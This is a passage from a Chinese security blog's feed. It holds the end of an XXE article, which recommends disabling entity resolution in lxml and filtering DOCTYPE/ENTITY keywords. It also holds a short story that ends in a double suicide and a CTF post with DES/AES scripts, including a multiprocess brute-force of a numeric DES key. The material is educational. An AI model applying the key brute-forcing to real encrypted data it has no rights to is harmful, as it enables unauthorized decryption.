<p>Python：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</div></pre></td></tr></table></figure></p>
<h5 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h5><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p>
<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/69</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">http://blog.csdn.net/u011721501/article/details/43775691</a><br><a href="https://b1ngz.github.io/XXE-learning-note/" target="_blank" rel="external">https://b1ngz.github.io/XXE-learning-note/</a><br><a href="http://bobao.360.cn/learning/detail/3841.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3841.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;你会挽着我的衣袖，我会把手揣进裤兜&lt;/blockquote&gt;&lt;br&gt;　　之前在参加一场CTF竞赛中遇到了xxe漏洞，由于当时并没有研究过此漏洞，解题毫无头绪。为了弥补web安全防御知识以及减少漏洞利用短板，我翻阅了一些关于xxe漏洞的资料，学习后在此总结分享。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://thief.one/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xxe漏洞" scheme="http://thief.one/tags/xxe%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="xml注入" scheme="http://thief.one/tags/xml%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>【原创小说】盲爱</title>
    <link href="http://thief.one/2017/06/15/1/"/>
    <id>http://thief.one/2017/06/15/1/</id>
    <published>2017-06-15T03:30:00.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受<br>直到我渐渐明白了爱情的真谛，那便是可以让我变成你</blockquote><br>　　最近想研究下SSRF漏洞，听说QQ空间、朋友网分享功能处曾经发现过此漏洞，于是我便打开了多年未用的QQ空间。原本我应该打开抓包软件，静静地分析起来，然而当我无意中看到空间日志中记录着的那些年少青春，思绪忍不住回到了4年以前，那个还是白衣少年的时光，于是便着急分享分享当年的文章。<br><a id="more"></a></p>
<p><center><img src="/upload_image/20170509/1.png" alt=""></center><br>我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受。我也不断地在倾听尘世的爱情，却怎么也想象不出其中的风景，毕竟如今我的世界只剩下黑暗。</p>
<p>原本我也亲眼见过那些美好的爱情故事，也目睹过那些忧伤的青春历程。但如今，那些已经成为我脑海中关于爱情的唯一记忆。杨花落尽，尘世一夜凋零，只有那无尽的黑暗取代了繁华似锦。</p>
<p>关于那场车祸，大致发生在一年前。劫难重生后，我便永远失去了光明，以及小娜美丽动听的声音。由于车祸，小娜的声线受到了严重创伤，恐怕这辈子都无法复原。尽管如此，自那以后她还是每日来到家中帮忙照顾我，毕竟家里只剩下了年迈的母亲。</p>
<p>小娜是我唯一的女友，从高中到现在一直都是。原本我们打算进阶婚姻的殿堂，只可惜邂逅了那场车祸。从此她成了哑巴，而我则成了瞎子。当一名瞎子与哑巴交流时，语言与手势已经无济于事，于是她便在我的左手心画字，以此来传达讯息。</p>
<p>我常常询问她为何只在我的左手心画字，她笑而不语，随后在手心画上了两个字：秘密。</p>
<p>虽然我的视线中只有无际的黑暗，但小娜的身影却如同一盏明灯般时时浮现。我知道，她一直在我身旁，有时甚至我会紧紧地抱着她，亲她。但她总是害羞地在左手心写上：妈在看我们。</p>
<p>我不知道为什么每次好事将近时，母亲总是站在不远处看着我们，当然这是小娜所传达的讯息。于是，我便会喊叫一声：“妈，你在吗？”</p>
<p>“诶，在，妈在。”母亲的声音越发沧桑，虽然看不见她的脸，但我能隐约感觉到她在流泪。</p>
<p>“妈，今晚做顿好吃的吧，小娜说她饿了。”我朝着母亲嬉笑道。</p>
<p>“嗯……嗯，好，好。”母亲楞了楞神，随后擦拭着脸颊的泪水，轻声应道。</p>
<p>望着母亲转身而去的背影，小娜在我的手心写上：我才没说饿了呢，是你饿了吧。</p>
<p>我嬉笑着迎合她，我知道此刻她一定是在对我吐舌翻白眼。这一切就好像从前，当我能看见她，她也能在我身边歌唱那会儿。她生气时的神情，她撒娇时的动作，都历历在目。只是此刻也只能凭借着记忆想象出她的神情与动作，大概还是与从前一样吧。</p>
<p>每当我坐在窗前，听着窗下的繁华似锦，眼前总会浮现出小娜的身影，而她也时时陪伴在我身边。我时常向她讲述我们以往的故事，那些爱情故事。她也总是聚精会神地聆听着，还时不时地插上几句。</p>
<p>我对她说，我们相识于夏末，相知于深秋，相爱于暖冬。我问她是否还记得那如柳絮般飘零的雪花？她沉默不语，随后便在左手心画了个大大的勾。我满意地笑了笑，随后又说，那场雪下得很大，大得将要把我俩淹没，但我们还是一如既往地站在那片白茫之上，因为你说我们要在那堆出最大的雪人，我们办到了。说完，我的眼泪也不住地挂出了眼眶。小娜温柔地拭擦去我眼角的泪水，在左手心写上：那是我见过最大的雪人。</p>
<p>小娜不在的时候，我也总是会一个人自言自语。后来，我独自聊到了那场车祸。那会我们坐在婚车上，准备驶向婚姻的殿堂，却差点就在天堂举行。呵呵，我坐在那静静地傻笑，笑这弄人的命运，笑这无情的苍天。</p>
<p>“你来了啊。”笑声落地后，我知道小娜来了，于是我招呼她坐在身边。她沉默不语，随后在我的左手心写上：妈说，她很爱你。</p>
<p>片刻后，我隐约听到她拉动窗帘的声响，于是大叫道：“小娜，别！别拉开窗帘。对我来说，此刻有没有它已不重要，重要的是你时时在我身边。”说罢，我伸出手臂，向着窗帘的方向招了招手：“来，到我身边陪着我。”我像只受伤的小猫，时刻离不开主人。</p>
<p>随后我感受到了小娜带来的温度，仿佛寒冬里的一拂暖阳，融化了我内心的悲伤。我紧紧地抱着她，这次我没有理会躲在角落观看的母亲，我毅然亲吻了她，那种感觉就好像梦境。</p>
<p>“我们继续完成那场夭折的婚礼好吗？”我祈求着小娜，眼角似乎干涩地流不出泪。</p>
<p>随后，我感受到了小娜在摇晃脑袋。她又一次拒绝了我，我已数不清这到底是我多少次的失败。后来，她如往常般在我的左手心画叉。停顿片刻后，她继续缓缓写上：我想让你一起亲眼见证那个时刻。</p>
<p>我欣慰地浅浅一笑，于是便开始期待重现光明的那一刻。</p>
<p>往后的那段时光中，我总是呆呆地坐在窗前，然后寻问身后的母亲：“妈，你说我的眼睛啥时能好呢？小娜可在等着我呢。”</p>
<p>“快了，快了。”这是母亲一贯的回答，我也已经听了无数遍，只是不知道她口中的“快了”是还要多久。我只知道母亲为了我找了不少医生，虽然有时他们隔得很远，但小娜说他们都在看着我摇头，我知道他们与母亲的谈话充斥着无奈。也许，真的是无药可救了吧。</p>
<p>每当医生摇头离开后，小娜总会紧握着我的手，在身旁不停地安慰我，但我知道其实她的心比我更痛。我抚摸着她的脸，让她别哭，她也抚摸着我干涩的眼角，在手心慢慢写道：一切都会好的。</p>
<p>这天，母亲叫离了我，将我扶到屋子一角。随后她对着我说，她要跟小娜谈谈。她渐渐走远了，但她与小娜的谈话却字字入耳，当然只是她一人在说：他的眼睛恐怕永远也好不了了，求你帮他拉开窗帘透透气吧，至少……至少让他见见阳光……</p>
<p>我不知道为什么母亲要跟小娜聊这些，我只是觉得母亲变了，变得魂不守舍，变得语无伦次。虽然耳边没有小娜回应的声音，但我隐约感觉到她在微微点头。渐渐地，我感觉她们的谈话越发得模糊，最后便完全听不清了。</p>
<p>母亲走后，小娜朝着我俏皮地做了个鬼脸，不知为何我感觉到了她的动作神情，也许只是感觉吧。我对她微微一笑，淡淡地问道：“妈跟你说了什么呀？”</p>
<p>她在左手心上写道：妈说，让我俩尽快完婚。</p>
<p>我微微一惊，满脸疑惑地回应道：“是……是吗，但……但是我的眼睛好不了了，不是吗？”</p>
<p>小娜没有回应我，只是静静地依偎在我怀里，聆听着我心脏的跳动。过了半响，她才淡淡地写道：“我会让你复明的。”</p>
<p>后来，小娜就从我身边消失了。那天，我竖起耳朵想要听清她发出的细微声音，可惜听到的只有越渐远离的脚步，最后连脚步声也消失不见了，剩下的只有死一般的寂静。</p>
<p>小娜离开后，我仿佛一个人过了很久很久，久得不知道年月。那些天，我还是照常坐于窗边，听着窗外热闹的街道，听着窗边呼啸而过的风，还有，还有那满天飘零的雪。</p>
<p>“冬天，来了吗？”我在心里这样念叨，毕竟瞎子的世界不仅没有白昼，更分不清年月。“呵呵，时间过得可真快，小娜呢，离开多久了？大概快半年了吧。”</p>
<p>母亲还是习惯性地轻轻推开一道门缝，透过缝隙静静地观察坐立窗边的我，一切都是那么无声无息。但是瞎子的听觉是异于常人的，因此每每她推开房门我便都能觉察到，但也只是彼此相对无声。</p>
<p>我原本以为时间就会这么一直匆匆逝去，直到我两鬓斑白，直到母亲西去独留我于尘世。然而上苍还是有好生之德，也许它并不喜欢凡尘的俗子就这样苟活于人世吧。</p>
<p>不久后，母亲口中的“快了”终于将要应验。那天，她兴奋地跑到我面前，激动地说：“妈给你找了全省最好的医生，这回你一定能变好。”说罢，她便哽咽地泪流满面。不知为何，我没有她那般兴奋，也许是因为小娜不再了吧！</p>
<p>片刻后，我隐约看到了一丝光线，却异常得模糊刺眼，以至于我下意识地想反抗这种光亮，于是我紧闭着眼睛，久久没有睁开。我猜想，医生一定是用电筒照了我的眼眸。后来，我开始反感一切明亮之物，因为它会让我觉得很痛。于是，到最后医生也只能无奈地离去。</p>
<p>他离开时，母亲就站在门外透过门缝看着我们，我知道她一定在那，因为她一直在那。房门关闭后，我隐约听到了母亲与医生的交谈，但内容便听不清了，我也不打算听清，大概又是些医学的专业名词以及一些无奈之语吧。</p>
<p>我呆呆地坐在那，心想：呵呵，真的是无药可救了吧！小娜，你在哪呢？”一个人待久了便会回望，于是我开始回想起很多事，包括与小娜在一起的那段时光。后来，我想起了小娜写给我的最后一句话：我会让你复明的。</p>
<p>我始终没能明白她话里的含意，也许只是一种安慰之词吧。直到后来，她再一次出现了。我不知道那是在清晨、黄昏还是午夜，反正她来了，衣肩似乎还带着点雪花。她静静地走到我身边，轻轻抚摸着我的脸颊，手心很凉，但我却感到很温暖。</p>
<p>“小娜，你去哪了？”我低声问道，眼眶打着泪珠。</p>
<p>她照常抚平我的左手心，然后缓慢地写道：我一直在你身边看着你呢。</p>
<p>“你……你为什么躲着不见我呢？”我失落地问道。</p>
<p>随后，我感觉她的脸颊微微一笑，好似看待撒娇的小孩那般看着我。紧接着，我感受到了左手心书写的字：因为我在找让你复明的方法。</p>
<p>“找到了吗？”我语气平淡地问道。</p>
<p>她犹豫了会，然后继续写道：嗯，我带你去个地方吧。</p>
<p>她这样写道，还没等我反应，她便拉着我往外走。我兴奋地笑了，因为我已经好久没有出过房门。不过不久后她便停下了脚步，她说，母亲正在门外静静地看着我们。</p>
<p>“妈，你在吗？”我照常大叫道。</p>
<p>“诶，在，妈在。”听着母亲抹泪后的回应，我心里不免一丝伤痛，因为只有她一直守候在我身边。我顿了顿身，朝着身边的小娜看了眼，虽然只有漆黑一片，但我知道她就在那，然后转头对着母亲说：“妈，我跟小娜要出去走走，你就在家等着我们吧。”</p>
<p>“诶……好……好，路……路上小心。”母亲颤颤巍巍地答道。</p>
<p>获得母亲的允许后，小娜便引着我踏上了屋外的世界。虽然看不见，但我依然听见了走离房间后的关门声，以及屋外瑟瑟的寒风。小娜说，外面是漫天的雪，就好像高中那会我们堆雪人时的那样，漫天飘零。在小娜的描述下，我似乎看见了那片雪地。我俯身随机抓了一把，手心忽感一阵凉意，那应该就是雪的温度吧。</p>
<p>这天，小娜带着我踏遍了无数的雪地，堆了各式的雪人。那些快乐的场景，那些雪人的模样，那场漫天的暴雪，还有小娜可爱迷人的姿态，一切都历历在目，虽然此刻我看不见。</p>
<p>我们在雪中玩了很久很久，久得忘记了白天黑夜。直到小娜说，她要走了。于是，我们便只能这样遗憾的散场，彼此缓缓撇下手心的最后一把雪。</p>
<p>回到家的时候，母亲似乎不在。我邀请小娜坐到我身边，陪着我聊天，陪着我看那场依然没有消散的雪。但她说，她要走了。起初我还以为她只是想回家，直到此刻我才知道，她是想离开我。</p>
<p>我紧紧地握着她的手，一刻不放，苦苦哀求道：“小娜，求你了，别离开我！”</p>
<p>她用力甩了甩手，力气大得将我摔倒在地。见状，她紧张地凑近我的身子，在左手心上写道：我找到了让你复明的办法，但我必须得离开你。</p>
<p>“不，不，如若这样，我宁愿永远活在黑暗中。”我嘶叫着，眼中满是恐惧与痛苦。</p>
<p>小娜没有继续写道，只是扶着我静静地走到窗边。她轻轻掀开了窗帘一角，我似乎看到了她嘴角的浅笑。她让我看一看窗外的世界，我顺着她的目光挪步到窗前，但迎面而来的只有刺眼的强光。我睁不开眼，只得用手挡住视线，我哀求道：“小娜，我的眼睛很痛，不，胸口很痛，求你把窗帘拉上吧！”</p>
<p>小娜没有理会我的哀求，只是转过脑袋静静地看着我。透过强光，我仿佛看到了她那双不舍的眼睛，似乎正在跟我说着离别。我眯着眼，试图看清她的模样，看清她眼角的泪，心中的伤。然而视线中却只有刺眼的天光，无尽延伸后迷茫了一切。</p>
<p>“小娜”我这样呼唤着她，但她只是看着我微微一笑。而后我似乎看见她轻轻地打开了玻璃窗，窗外吹进的清风吹拂了她的长发，风中衣袂飘飘。</p>
<p>迎着天光，迎着清风，她回眸一笑。我也笑了，笑得很甜，因为此刻她在我眼中很美，她穿着嫁衣，白色嫁衣。我渐渐明白，她是想与我一道完成那场婚礼，因为我已经渐渐看清了她的容颜。</p>
<p>我慢慢地走近她，想近距离地看清她，抚摸她。然而，她伸出右手阻止了我，她嘴角微微一笑，笑出了声，似乎还没等到我走出这迷幻的世界，她便已纵身跃向了窗外的纷飞繁华。</p>
<p>“不！”我疯狂地吼叫着，试图挽回跳窗而下的小娜，但已为时过晚。</p>
<p>叫声过后，母亲奋力开启了房门。她静静地望着窗边的我，我绝望地看着门外的她。对望间，我看见了她眼角的泪以及写满整张脸的恐惧。</p>
<p>她看着我缓缓走向窗边，看着我轻轻打开玻璃窗。于是，她开始嘶吼，她试图阻止我的行动。她奋力扑身而来，就如同我扑向小娜那般，但我阻止了她。我对着她微微一笑，笑出了声，似乎还没等她走近我的世界，我便纵身消失在她的视线中。</p>
<p>下落间，我仿佛听见了母亲撕心裂肺的吼叫，那般绝望痛苦。但我很想告诉她，我即将要跟小娜完婚，因为我看见自己身上正穿着结婚那日的礼服。</p>
<p>慢慢地，我慢慢接近了小娜，我看见她就躺在我身边，同样的一片血泊之中。我笑了，我笑我们终于可以如愿以偿，终于可以听见礼堂的钟声，终于可以完成婚礼，即使这一切发生在天堂。</p>
<p>我看见小娜紧闭着眼睛，嘴角是浅浅的笑容，我知道她也一定很高兴吧。我吃力地爬到她身边，想凑近看清她的容颜，是否也美如当年呢？</p>
<p>渐渐地，我渐渐看清了她，然而映入我眼帘的并不是小娜，而是我自己。</p>
<p>呵呵，是我吗？</p>
<p>后来，我似乎听见了母亲与医生的那段谈话。</p>
<p>“你儿子患的是精神分裂与妄想症，要想治愈必须找到他幻想出的小娜，因为只有她才能打开他心里的那扇窗，才能带他重新回归光明与现实。”医生担忧道。</p>
<p>“小娜，她已经死了。那是在一年以前，我记得那天下着大雪，他们坐着婚车准备前往礼堂。然而那天的雪下得很大，大得几乎将要把他们淹没。当婚车经过盘山公路时，由于车轮打滑，车身失去了方向，便连人带车一道滚下了山崖。后来，他获救了，但小娜却永远埋在了白雪之下。自那以后，他便将自己关在这黑屋之中，常常坐着自言自语，我想他一定是见到小娜了，一定是！”母亲哽咽道。</p>
<p>后来，我似乎又听到了母亲说的那段对话：“他的眼睛恐怕永远也好不了了，求你帮他拉开窗帘透透气吧，至少……至少让他见见阳光。”原本我以为这是母亲对小娜说的话，后来才知道，她说话时一直望着我。</p>
<p>我感觉自己昏昏欲睡，仿佛身处梦境。于是，我隐约听到了小娜的笑声，她笑着问我：“你爱我吗？”</p>
<p>“傻瓜，这还用问吗？”<br>“那你有多爱我？”<br>“呃……爱到可以让我变成你！”</p>
<p>呵呵，小娜，原来我已经爱到变成了你，至少右手变成了你。原来你所说复明的方法就是让你消失，不，如若那样，我宁愿永远活在黑暗与幻想中，至少那样很美。</p>
<p>梦中我仿佛闻到了花香，寒冬逝去，暖春归来。</p>
<p>我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受。直到我渐渐明白了爱情的真谛，那便是可以让我变成你！</p>
<p>the end。</p>
<p>后记：盲爱这篇小说本来是为了参加短篇大赛准备的，只可惜没有被选中，原因是文风太青涩，现在读来却是如此，但本篇是我最喜爱的一篇，因为剧情有很多耐人寻味的点，这也是我最想表达的东西。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受&lt;br&gt;直到我渐渐明白了爱情的真谛，那便是可以让我变成你&lt;/blockquote&gt;&lt;br&gt;　　最近想研究下SSRF漏洞，听说QQ空间、朋友网分享功能处曾经发现过此漏洞，于是我便打开了多年未用的QQ空间。原本我应该打开抓包软件，静静地分析起来，然而当我无意中看到空间日志中记录着的那些年少青春，思绪忍不住回到了4年以前，那个还是白衣少年的时光，于是便着急分享分享当年的文章。&lt;br&gt;
    
    </summary>
    
      <category term="诗意年华" scheme="http://thief.one/categories/%E8%AF%97%E6%84%8F%E5%B9%B4%E5%8D%8E/"/>
    
    
      <category term="原创小说" scheme="http://thief.one/tags/%E5%8E%9F%E5%88%9B%E5%B0%8F%E8%AF%B4/"/>
    
  </entry>
  
  <entry>
    <title>CTF加密与解密</title>
    <link href="http://thief.one/2017/06/13/1/"/>
    <id>http://thief.one/2017/06/13/1/</id>
    <published>2017-06-13T03:22:25.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">科技的精灵已经从瓶中跑了出来，但我们还不知道真正降临的时刻</blockquote><br>　　今日在翻看笔记的时候，无意看到了之前为参加CTF时做的准备工作，主要包括了各种加密解密，web安全，PWN溢出等内容的练习题以及解决脚本。由于内容部分来自本人参加ctf时所做的题以及部分来自互联网，因此准备在此分享记录一番。本篇主要介绍几种CTF中常见加密算法的解密脚本，关于加密原理会适当提及，但不会深入。<br><a id="more"></a></p>
<h3 id="DES解密"><a href="#DES解密" class="headerlink" title="DES解密"></a>DES解密</h3><p>原理不多说了，直接放脚本源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#Des算法一般密钥长度为8位（可以是8的倍数），且加密与解密算法相同。（私有密钥，对称加密方式）</span></div><div class="line">from pyDes import *</div><div class="line">import threading</div><div class="line">import Queue</div><div class="line">import os</div><div class="line">import sys</div><div class="line">import time</div><div class="line">from multiprocessing import Process,Pool,Manager</div><div class="line">import multiprocessing</div><div class="line"></div><div class="line">class maskdes:</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    DES加密算法</div><div class="line">    des(key,[mode],[IV],[pad],[padmode])</div><div class="line">    @key:密钥(8位长度)</div><div class="line">    @mode：模式，支持CBC与ECB</div><div class="line">    @IV：</div><div class="line">    @pad：</div><div class="line">    @padmode：</div><div class="line">    @data：明文</div><div class="line">    @data_en：密文</div><div class="line">    '<span class="string">''</span></div><div class="line">    def __init__(self):</div><div class="line">        pass</div><div class="line"></div><div class="line">    def maskencrypt(self,data,key):</div><div class="line">        <span class="string">''</span><span class="string">'</span></div><div class="line">        明文加密</div><div class="line">        @data:明文</div><div class="line">        @key:密钥</div><div class="line">        '<span class="string">''</span></div><div class="line">        k = des(key,CBC,<span class="string">"\0\0\0\0\0\0\0\0"</span>,pad=None,padmode=PAD_PKCS5) <span class="comment">#des对象</span></div><div class="line">        data_en = k.encrypt(data)       <span class="comment">#进行des加密，返回密文</span></div><div class="line">        </div><div class="line">        <span class="comment"># print u"密文: %r" % data_en</span></div><div class="line"></div><div class="line">        <span class="built_in">return</span> data_en</div><div class="line"></div><div class="line">    def maskdecrypt(self,data,key):</div><div class="line">        <span class="string">''</span><span class="string">'</span></div><div class="line">        密文解密</div><div class="line">        @data:密文</div><div class="line">        @key:密钥</div><div class="line">        '<span class="string">''</span></div><div class="line">        k = des(key,CBC,<span class="string">"\0\0\0\0\0\0\0\0"</span>,pad=None,padmode=PAD_PKCS5) <span class="comment">#des对象</span></div><div class="line">        data_de = k.decrypt(data)   <span class="comment">#进行des解密，返回明文</span></div><div class="line"></div><div class="line">        <span class="comment"># print u"明文: %r" % data_de</span></div><div class="line"></div><div class="line">        <span class="built_in">return</span> data_de</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def des_run(key,cur,data_en):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    破解des密码函数</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="comment">#print key</span></div><div class="line">    </div><div class="line">    data_de=cur.maskdecrypt(data_en,str(key))</div><div class="line">    <span class="keyword">if</span> data_de==<span class="string">"Hello World"</span>:</div><div class="line">        <span class="built_in">print</span> data_de</div><div class="line">        <span class="built_in">return</span> True</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> False</div><div class="line">        </div><div class="line">        </div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    已知一个明文，以及密钥，求密文？</div><div class="line">    '<span class="string">''</span></div><div class="line">    key=<span class="string">"10036934"</span></div><div class="line">    data = <span class="string">"Hello World"</span> <span class="comment">#明文</span></div><div class="line"></div><div class="line">    cur=maskdes()</div><div class="line">    data_en=cur.maskencrypt(data,key)</div><div class="line">    <span class="built_in">print</span> u<span class="string">"密文: %r"</span> % data_en</div><div class="line">    with open(<span class="string">"result.txt"</span>,<span class="string">"w"</span>) as w:</div><div class="line">        w.write(data_en)</div><div class="line"></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    已知一个密文文件，已知长度为8位的密钥(纯数字)，求明文？</div><div class="line">    解密时，直接将文本中的内容读取复制给一个变量，进行解密即可</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="comment">#-------------------------多进程---------------------------</span></div><div class="line">    cur=maskdes()</div><div class="line">    data_en=open(<span class="string">"result.txt"</span>,<span class="string">"r"</span>).<span class="built_in">read</span>()  <span class="comment">##从文件中读取密文</span></div><div class="line">    </div><div class="line">    start=time.time()</div><div class="line">    result=Queue.Queue()</div><div class="line">    pool = Pool()</div><div class="line"></div><div class="line">    def pool_th():</div><div class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> xrange(10000000,11111111): <span class="comment">##密钥范围</span></div><div class="line">            try:</div><div class="line">                result.put(pool.apply_async(des_run,args=(key,cur,data_en)))   <span class="comment">#维持执行的进程总数为10，当一个进程执行完后添加新进程.</span></div><div class="line">            except:</div><div class="line">                <span class="built_in">break</span></div><div class="line"></div><div class="line">    def result_th():</div><div class="line">        <span class="keyword">while</span> 1:</div><div class="line">            a=result.get().get()</div><div class="line">            <span class="keyword">if</span> a:</div><div class="line">                pool.terminate()</div><div class="line">                <span class="built_in">break</span></div><div class="line"></div><div class="line">    t1=threading.Thread(target=pool_th)</div><div class="line">    t2=threading.Thread(target=result_th)</div><div class="line">    t1.start()</div><div class="line">    t2.start()</div><div class="line">    t1.join()</div><div class="line">    t2.join()</div><div class="line"></div><div class="line">    <span class="built_in">print</span> <span class="string">"add Process end"</span></div><div class="line">    pool.join()</div><div class="line">    end=time.time()</div><div class="line">    <span class="built_in">print</span> <span class="string">'time is '</span>,end-start</div></pre></td></tr></table></figure></p>
<h3 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h3><p>Aes解密脚本源码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- encoding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">AES算法，密钥（key）长度一般为16,24,32位，密文一般为128位，192位，256位。</div><div class="line">'<span class="string">''</span></div><div class="line">from Crypto.Cipher import AES</div><div class="line">from Crypto import Random</div><div class="line"></div><div class="line">def encrypt(data, password):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    AES加密算法</div><div class="line">    '<span class="string">''</span></div><div class="line">    bs = AES.block_size</div><div class="line">    pad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)</div><div class="line">    iv = Random.new().<span class="built_in">read</span>(bs)</div><div class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</div><div class="line">    data = cipher.encrypt(pad(data))</div><div class="line">    data = iv + data</div><div class="line">    <span class="built_in">return</span> data</div><div class="line"></div><div class="line">def decrypt(data, password):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    DES解密算法</div><div class="line">    '<span class="string">''</span></div><div class="line">    bs = AES.block_size</div><div class="line">    <span class="keyword">if</span> len(data) &lt;= bs:</div><div class="line">        <span class="built_in">return</span> data</div><div class="line">    unpad = lambda s : s[0:-ord(s[-1])]</div><div class="line">    iv = data[:bs]</div><div class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</div><div class="line">    data  = unpad(cipher.decrypt(data[bs:]))</div><div class="line">    <span class="built_in">return</span> data </div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    data = <span class="string">'flagadadh121lsf9adad'</span> <span class="comment">#要加密的数据</span></div><div class="line">    password = <span class="string">'123456789abcdefg'</span> <span class="comment">#16,24,32位长的密码</span></div><div class="line">    encrypt_data = encrypt(data, password)  <span class="comment">##获取加密后的字符串</span></div><div class="line">    <span class="built_in">print</span> <span class="string">'encrypt_data:'</span>, encrypt_data  <span class="comment">#&lt;str&gt;</span></div><div class="line">    </div><div class="line">    decrypt_data = decrypt(encrypt_data, password)</div><div class="line">    <span class="built_in">print</span> <span class="string">'decrypt_data:'</span>, decrypt_data  <span class="comment">#&lt;str&gt;</span></div></pre></td></tr></table></figure></p>
